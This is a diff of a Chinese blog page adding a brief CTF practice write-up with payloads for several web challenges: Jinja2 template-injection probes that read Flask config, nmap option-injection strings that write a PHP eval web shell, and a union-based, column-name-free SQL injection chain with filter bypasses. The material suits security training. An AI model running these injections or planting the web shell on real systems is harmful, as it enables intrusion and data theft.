@@ -29,16 +29,19 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"blog.haorical.top","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":false,"lazyload":false,"nav":{"disqus":{"text":"Load Disqus","order":-1},"gitalk":{"order":-2}},"activeClass":"changyan"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":true,"preload":true}};
   </script>
-<meta name="description" content="ctf退役种子选手">
+<meta name="description" content="最近身体出了点状况，没时间也没精力刷了，先勉强做几个">
 <meta property="og:type" content="article">
 <meta property="og:title" content="20220213">
 <meta property="og:url" content="http://blog.haorical.top/posts/36b3cc80/index.html">
 <meta property="og:site_name" content="haorical的博客">
-<meta property="og:description" content="ctf退役种子选手">
+<meta property="og:description" content="最近身体出了点状况，没时间也没精力刷了，先勉强做几个">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-02-13T14:02:52.000Z">
-<meta property="article:modified_time" content="2022-02-13T14:02:52.428Z">
+<meta property="article:modified_time" content="2022-02-14T09:09:39.399Z">
 <meta property="article:author" content="Haorical">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
 
 
@@ -191,7 +194,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -204,6 +207,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#WesternCTF2018-shrine"><span class="nav-number">1.</span> <span class="nav-text">[WesternCTF2018]shrine</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Nmap"><span class="nav-number">2.</span> <span class="nav-text">[网鼎杯 2020 朱雀组]Nmap</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPU2019-Web1"><span class="nav-number">3.</span> <span class="nav-text">[SWPU2019]Web1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MRCTF2020-PYWebsite"><span class="nav-number">4.</span> <span class="nav-text">[MRCTF2020]PYWebsite</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUCTF-2019-Pythonginx"><span class="nav-number">5.</span> <span class="nav-text">[SUCTF 2019]Pythonginx</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -311,6 +315,22 @@
 
       <time title="创建时间：2022-02-13 22:02:52" itemprop="dateCreated datePublished" datetime="2022-02-13T22:02:52+08:00">2022-02-13</time>
     </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2022-02-14 17:09:39" itemprop="dateModified" datetime="2022-02-14T17:09:39+08:00">2022-02-14</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
+        </span>
+    </span>
 
   
     <span id="/posts/36b3cc80/" class="post-meta-item leancloud_visitors" data-flag-title="20220213" title="阅读次数">
@@ -343,14 +363,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>0</span>
+      <span>1.6k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>3 分钟</span>
     </span>
 </div>
 
@@ -361,7 +381,22 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        
+        <blockquote>
+<p>最近身体出了点状况，没时间也没精力刷了，先勉强做几个</p>
+</blockquote>
+<span id="more"></span>
+<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__&#125;&#125;</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#39; -oN shell.php &lt;?php phpinfo();php?&gt;</span><br><span class="line">127.0.0.1&#39; -oG shell.phtml &lt;?&#x3D;echo &#39;hhh&#39;;?&gt;&#39;</span><br><span class="line">127.0.0.1&#39; &lt;?&#x3D; @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#39;</span><br><span class="line"></span><br><span class="line">注意闭合ip的引号，前后都有，后面需要加个空格，过滤了php</span><br></pre></td></tr></table></figure>
+
+<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><blockquote>
+<p>无列名注入，很久没用，快忘没了</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="http://595965e7-4cd3-4ade-a52d-0e49beefc3de.node4.buuoj.cn:81/login.php">http://595965e7-4cd3-4ade-a52d-0e49beefc3de.node4.buuoj.cn:81/login.php</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1,2,3#</span></span><br><span class="line"><span class="string">过滤or #</span></span><br><span class="line"><span class="string">把空格替换了</span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27; web1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">or被过滤用</span></span><br><span class="line"><span class="string">select group_concat(table_name) from mysql.innodb_table_stats where database_name=database()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name<span class="operator">=</span>&quot;web1&quot;<span class="string">&#x27; ads,users</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">查不到列名，无列名注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(b)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>b<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="operator">*</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>users)n),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p>flag.php xff</p>
+<h2 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h2>
     </div>
 
     
@@ -417,6 +452,11 @@
   </div>
 </div>
 
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
 
         
 
@@ -479,13 +519,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">176k</span>
+    <span title="站点总字数">177k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">4:53</span>
+    <span title="站点阅读时长">4:55</span>
   </span>
 </div>
 <div class="busuanzi-count">
